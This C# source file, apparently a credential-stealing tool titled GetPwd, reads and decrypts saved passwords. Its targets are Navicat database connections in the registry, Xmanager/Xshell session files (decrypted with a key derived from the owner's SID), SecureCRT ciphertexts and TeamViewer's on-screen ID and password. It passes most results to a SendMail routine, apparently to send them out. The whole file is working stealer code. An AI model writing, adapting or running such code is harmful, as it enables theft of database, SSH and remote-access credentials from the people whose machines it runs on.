using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.DirectoryServices;
using System.Security.Cryptography;

namespace GetPwd
{
    public struct WindowInfo
    {
        public IntPtr hWnd;

        public string szWindowName;

        public string szClassName;
    }

    class Program
    {
        public delegate bool EnumChildProc(IntPtr hwnd, IntPtr lParam);

        public static List<WindowInfo> wndList = new List<WindowInfo>();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hwndParent, EnumChildProc EnumFunc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern int GetClassNameW(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern int GetWindowTextW(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern int SendMessage(IntPtr hwnd, int wMsg, int wParam, StringBuilder lParam);

        static void Main(string[] args)
        {
            Console.WriteLine("");
            Console.WriteLine("Author: wh4am1");
            Console.WriteLine("Github: https://github.com/sf197");
            Console.WriteLine("Blog: https://www.cnblogs.com/wh4am1");
            Console.WriteLine("");
            SecureCRTPwd();
            Console.WriteLine("read done!");
            Console.ReadKey();
        }

        public static void SecureCRTPwd() {
            StringBuilder strbuf = new StringBuilder();

            strbuf.Append("[*] Password:" + SecureCRTCipher.PasswordCRT("ac230fec9ceb3a23f1df712c51c556f19264e68dc544acfc"));
            strbuf.Append(Environment.NewLine);
            strbuf.Append("[*] Password V2:" + SecureCRTCipher.V2CRT("6029dd61ef0e2358e522d8d4037f8cf3"));
            strbuf.Append(Environment.NewLine);

            SendMail.Send(strbuf);
        }

        public static void NavicatPwd() {
            List<string> list = new List<string>();
            list.AddRange(new string[5]
            {
            "MySql:Software\\PremiumSoft\\Navicat\\Servers",
            "SQL Server:Software\\PremiumSoft\\NavicatMSSQL\\Servers",
            "Oracle:Software\\PremiumSoft\\NavicatOra\\Servers",
            "pgsql:Software\\PremiumSoft\\NavicatPG\\Servers",
            "MariaDB:Software\\PremiumSoft\\NavicatMARIADB\\Servers"
            });
            StringBuilder strbuf = new StringBuilder();
            foreach (string item in list)
            {
                string str;
                string[] array = Regex.Split(item, ":", RegexOptions.IgnoreCase);
                string arg = array[0].ToString();
                string basekey = array[1].ToString();
                str = DecryptStr(basekey);
                strbuf.Append("[*] DatabaseName:" + arg);
                strbuf.Append(Environment.NewLine);
                strbuf.Append(str);
                strbuf.Append(Environment.NewLine);
            }
            SendMail.Send(strbuf);
        }

        public static void TeamViewPwd() {
            IntPtr intPtr = FindWindow(null, "TeamViewer");
            if (intPtr == IntPtr.Zero)
            {
                Console.WriteLine("没找到TeamViewer进程或使用了修改版本");
                return;
            }
            EnumChildProc enumFunc = EnumFunc;
            EnumChildWindows(intPtr, enumFunc, IntPtr.Zero);
            foreach (WindowInfo wnd in wndList)
            {
                if (!string.IsNullOrEmpty(wnd.szWindowName))
                {
                    if (wnd.szWindowName.Equals("您的ID") || wnd.szWindowName.Equals("密码") || wnd.szWindowName.Equals("Your ID") || wnd.szWindowName.Equals("Password"))
                    {
                        int index = wndList.IndexOf(wnd);
                        Console.WriteLine(wnd.szWindowName + ":" + wndList[index + 1].szWindowName);
                    }
                }
            }
        }

        public static void XmangagerPwd()
        {
            List<string> xsh_pathlist = XmangagerCrypt.checkPath();
            StringBuilder strbuf = new StringBuilder();
            foreach (string path in xsh_pathlist)
            {
                FileInfo fileInfo = new FileInfo(path);
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                IdentityReference identityReference = fileSecurity.GetOwner(typeof(NTAccount));
                int idx = identityReference.Value.IndexOf('\\');
                if (idx == -1)
                {
                    idx = identityReference.Value.IndexOf('@');
                }
                string userName = identityReference.Value.Substring(idx + 1);
                string userSid = null;

                try
                {
                    DirectoryEntry obDirEntry = new DirectoryEntry("WinNT://" + identityReference.Value.Replace(@"\", @"/"));
                    PropertyCollection coll = obDirEntry.Properties;
                    object obVal = coll["objectSid"].Value;
                    userSid = userName + XmangagerCrypt.ConvertByteToStringSid((Byte[])obVal);//获取该所有者的SID
                }
                catch (System.Runtime.InteropServices.COMException)
                {
                    continue;
                }


                using (StreamReader sr = new StreamReader(path))
                {
                    string Host = "null";
                    string UserName = "null";
                    string password = "null";
                    string rawPass;
                    string pattern = @"Password=(.*?)";
                    while ((rawPass = sr.ReadLine()) != null)
                    {
                        if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"Host=(.*?)"))
                        {
                            Host = rawPass.Replace("Host=", "");
                        }
                        if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, pattern))
                        {
                            rawPass = rawPass.Replace("Password=", "");
                            if (rawPass.Equals(""))
                            {
                                continue;
                            }
                            byte[] data = Convert.FromBase64String(rawPass);
                            byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(userSid));

                            byte[] passData = new byte[data.Length - 0x20];
                            Array.Copy(data, 0, passData, 0, data.Length - 0x20);
                            byte[] decrypted = RC4.Decrypt(Key, passData);
                            password = Encoding.ASCII.GetString(decrypted);
                        }
                        if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"UserName=(.*?)"))
                        {
                            UserName = rawPass.Replace("UserName=", "");
                        }
                    }
                    strbuf.Append("Host: "+Host+"  UserName: "+ UserName + "  Decrypt: "+ password);
                }
                strbuf.Append(Environment.NewLine);
            }
            SendMail.Send(strbuf);
        }

        public static bool EnumFunc(IntPtr hWnd, IntPtr lParam)
        {
            StringBuilder stringBuilder = new StringBuilder(256);
            GetClassNameW(hWnd, stringBuilder, stringBuilder.Capacity);
            if (stringBuilder.ToString() == "Edit" || stringBuilder.ToString() == "Static")
            {
                WindowInfo item = default(WindowInfo);
                item.hWnd = hWnd;
                item.szClassName = stringBuilder.ToString();
                if (item.szClassName == "Edit")
                {
                    StringBuilder stringBuilder2 = new StringBuilder(256);
                    SendMessage(hWnd, 13, 256, stringBuilder2);
                    item.szWindowName = stringBuilder2.ToString();
                }
                else
                {
                    GetWindowTextW(hWnd, stringBuilder, stringBuilder.Capacity);
                    item.szWindowName = stringBuilder.ToString();
                }
                wndList.Add(item);
            }
            return true;
        }

        private static string DecryptStr(string basekey)
        {
            StringBuilder stb = new StringBuilder();
            Navicat11Cipher navicat11Cipher = new Navicat11Cipher();
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey);
            if (registryKey == null)
            {
                return null;
            }
            string[] subKeyNames = registryKey.GetSubKeyNames();
            foreach (string text in subKeyNames)
            {
                stb.Append("  [+] ConnectName: "+ text);
                RegistryKey registryKey2 = registryKey.OpenSubKey(text);
                if (registryKey2 != null)
                {
                    string arg = (registryKey2.GetValue("Host") != null) ? registryKey2.GetValue("Host").ToString() : "";
                    string arg2 = (registryKey2.GetValue("UserName") != null) ? registryKey2.GetValue("UserName").ToString() : "";
                    string ciphertext = (registryKey2.GetValue("Pwd") != null) ? registryKey2.GetValue("Pwd").ToString() : "";
                    stb.Append("  [>] Host: " + arg);
                    stb.Append("  [>] UserName: " + arg2);
                    stb.Append("  [>] Password: " + navicat11Cipher.DecryptString(ciphertext));
                    stb.Append(Environment.NewLine);
                }
            }
            return stb.ToString();
        }
    }
}
